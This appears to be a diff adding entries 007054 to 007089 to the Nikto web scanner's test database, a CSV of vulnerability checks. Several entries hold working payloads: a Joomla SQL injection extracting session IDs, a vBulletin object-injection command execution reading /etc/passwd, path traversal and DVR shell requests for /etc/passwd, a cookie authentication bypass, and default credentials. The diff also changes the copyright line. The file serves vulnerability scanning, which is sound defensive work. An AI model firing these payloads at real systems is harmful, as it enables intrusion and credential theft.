@@ -1,6 +1,6 @@
 #######################################################################
 # File Source: https://cirt.net
-# (c) 2001-2015 Chris Sullo, All Rights Reserved.
+# (c) 2001 Chris Sullo, All Rights Reserved.
 # This file may only be distributed and used with the full Nikto package.
 # This file may not be used with any software product without written permission from
 # Chris Sullo (csullo@gmail.com)
@@ -6995,3 +6995,39 @@
 "007051","0","be","@HYBRISlogin.jsp","GET","[H|h]ybris","","[A|a]dministration\s[C|c]onsole","","","SAP Hybris Administration Console found. Default credentials are admin:nimda","",""
 "007052","","23","/cfg/CFGConnectionParams.txt","GET","user=","","","","","Caremark Carestream config file found. May include account information and host data..","",""
 "007053","","23","/serverVars.js","GET","SERVER_IPADDRESS","","","","","Caremark Carestream JavaScript config file found. May include host information..","",""
+"007054","","9","/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1&list[select]=(select%201%20FROM(select%20count(*),concat((select%20(select%20concat(session_id))%20FROM%20jml_session%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)","GET","Duplicate\sEntry","Subquery","","","","Joomla is vulnerable to a SQL injection which can lead to administrator access. https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/?page=1&year=0&month=0","",""
+"007055","","3b","/azenv.php","GET","HTTP_CONNECTION","","","","","This program is a proxy test script which echoes environment variables.","",""
+"007056","","be","@PIWIKindex.php","GET","<title>.*[Pp]iwik.*</title>","http://piwik.org","200","","","Piwik Analytics login found.","",""
+"007057","","123b","@PIWIKCHANGELOG.md","GET","## Piwik ([0-9.]+)","","200","","","Piwik Analytics Changelog identified.","",""
+"007058","CVE-2015-7808,http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/","8","@VBULLETINajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A25%3A%22system%28%27cat%20%2Fetc%2Fpasswd%27%29%22%3B%7D","GET","root:0","","","","","vBulletin 5 contains a remote command execution see.","",""
+"007059","","3","/GulpFile.js","GET","var\sgulp","","","","","GulpFile.js build config may reveal sensitive information.","",""
+"007060","http://www.madirish.net/node/465","3","/admin/views/ajax/autocomplete/user/a","GET","\"admin\":","","","","","Drupal Views module discloses user names, including the administrator.","",""
+"007061","","e","/en/setup","GET","401","","","","","Silex USB-device has a default credential root: (empty password) set.","",""
+"007062","","e","/page.cmd","POST","(IP configuration|Subnet mask|Default route|Primary DNS)","","","","","Unify/Siemens OpenStage SIP has a default password 123456 set.","page_submit=WEBMp_Admin_Login&page-next=WEBM_Admin_IpConfiguration&AdminPassword=123456",""
+"007063","","e","/page.cmd","POST","(IP configuration|Subnet mask|Default route|Primary DNS)","","","","","Unify/Siemens OpenStage SIP has a default password 123456 set.","page_submit=WEBMp_AdminLogin&page-next=WEBM_Admin_IpConfiguration&WEBMv-Admin-Password=123456",""
+"007064","","e","/page.cmd","POST","(IP configuration|Subnet mask|Default route|Primary DNS)","","","","","Unify/Siemens OpenStage SIP has a default password 123456 set.","page_submit=WEBMp_AdminLogin&page-next=WEBM_Admin_IpConfiguration&AdminPassword=123456",""
+"007065","","e","/authorize","POST","Access Granted. This IP Address now has admin","access to the restricted printer pages.","","","","Zebra PrintServer Webinterface has a default password 1234 set.","0=1234",""
+"007066","","eb","/sitecore/login","GET","Sitecore.NET","","","","","Sitecore CMS login found.","",""
+"007067","","eb","/sitecore/admin/login.aspx?returnUrl=/","GET","into\sSitecore","","","","","Sitecore CMS admin login found.","",""
+"007068","","b","/admin/sites/new","GET","401","","","","","ComfortableMexicanSofa CMS Engine Admin Backend (pass protected)","",""
+"007069","","b","/cms-admin/sites/new","GET","401","","","","","ComfortableMexicanSofa CMS Engine Admin Backend (pass protected)","",""
+"007070","","be","/struts/webconsole.html","GET","wc-command","","","","","Struts debugging is enabled and OGNL console is available.","",""
+"007071","","3b","/owa/auth/logon.aspx","GET","<title>Outlook Web App</title>","(/owa/([0-9.]+)/themes/|/owa/auth/([0-9.]+)/themes/)","","","","Outlook Web App identified. OWA is exposing its version within the themes path like /owa/auth/15.0.995/themes.","",""
+"007072","","be","/system/console/configMgr","GET","401","","","","","Adobe Experience Manager OSGi console.","",""
+"007073","","be","/system/console/bundles","GET","401","","","","","Adobe Experience Manager OSGi console found.","",""
+"007074","","be","/system/sling/cqform/defaultlogin.html","GET","QUICKSTART_HOMEPAGE","","","","","Adobe Experience Manager Sling console.","",""
+"007075","","be","/crx/de/index.jsp","GET","crxde_favicon.ico","","","","","Adobe Experience Manager CRXDE console.","",""
+"007076","","be","/libs/cq/core/content/login.html","GET","CQ5 - Sign In","","","","","Adobe Experience Manager CQ5 admin login.","",""
+"007077","","5","/scgi-bin/platform.cgi","POST","root:","loic_ipsec:","","","","Devices with Cisco http firewall are prone to a local file inclusion. https://www.exploit-db.com/exploits/39184/","button.login.home=Se%20connecter&Login.userAgent=0x4148_Fu&reload=0&SSLVPNUser.Password=0x4148Fu&SSLVPNUser.UserName=0x4148&thispage=../../../../../../etc/passwd%00",""
+"007078","","3","@PAGESPEED","GET","<b>Pagespeed\sAdmin</b>","","","","","This reveals information about the running Pagespeed Module (mod_pagespeed/ngx_pagespeed). Comment out appropriate line in the webservers conf file or restrict access to allowed sources.","",""
+"007079","http://appcheck-ng.com/unpatched-vulnerabilites-in-magento-e-commerce-platform/","4","@MAGENTOskin/adminhtml/default/default/media/editor.swf","GET","@MD5259afd515d7b2edee76f67973fea95a6","","","","","Several Adobe Flash files that ship with Magento are vulnerable to DOM based Cross Site Scripting (XSS). ","",""
+"007080","http://appcheck-ng.com/unpatched-vulnerabilites-in-magento-e-commerce-platform/","4","@MAGENTOskin/adminhtml/default/default/media/uploader.swf","GET","@MD51c300001dadd932ef6e33a2fadf941e1","","","","","Several Adobe Flash files that ship with Magento are vulnerable to DOM based Cross Site Scripting (XSS).","",""
+"007081","http://appcheck-ng.com/unpatched-vulnerabilites-in-magento-e-commerce-platform/","4","@MAGENTOskin/adminhtml/default/default/media/uploaderSingle.swf","GET","@MD5304dd960698c5786dcd64b0e138f80ca","","","","","Several Adobe Flash files that ship with Magento are vulnerable to DOM based Cross Site Scripting (XSS).","",""
+"007082","","23","/.MySCMServerInfo","GET","SCMBranch","","","","","Surround SCM file reveals a list of files in source control.","",""
+"007083","","23","/_diagnostic.jsp","GET","WebDX\sSC","","","","","GE Centricity PACS WebDX diagnostics page reveals detailed application and system information.","",""
+"007084","https://www.pentestpartners.com/blog/pwning-cctv-cameras/","8","/shell?cat%20/etc/passwd","GET","root:.*:0:[01]:","","","","","Multiple DVR devices are prone to a remote command execution.","",""
+"007085","","ae","/view2.html","GET","<span\slxc_lang=\"view_Channel\">Channel</span>","<a\sid=\"connectAll\"\slxc_lang=\"view_Connect_all\">","200","","","Multiple DVR devices are prone to an authentication bypass.","","Cookie: dvr_camcnt=24; dvr_usr=null; dvr_pwd=null"
+"007086","https://www.pentestpartners.com/blog/pwning-cctv-cameras/","ae","/main.html","GET","<span\slxc_lang=\"view_Channel\">Channel</span>","<a\sid=\"connectAll\"\slxc_lang=\"view_Connect_all\">","200","","","Multiple DVR devices are prone to an authentication bypass.","","Cookie: dvr_camcnt=24; dvr_usr=null; dvr_pwd=null"
+"007087","","b","@SYMPHONYREADME.markdown","GET","http://getsymphony.com","","200","","","Symphony CMS README file found containing the version of the CMS.","",""
+"007088","","b","@SYMPHONYREADME","GET","Symphony\s([0-9.]+)","","200","","","Symphony CMS README file found containing the version of the CMS.","",""
+"007089","","3b","@AXIS2services/Version?method=getVersion","GET","Apache\sAxis\sversion","The\sAXIS\sengine\scould\snot\sfind\sa\starget\sservice\sto\sinvoke!","","","","Apache Axis identified. This URL might also expose the running version of Axis.","",""
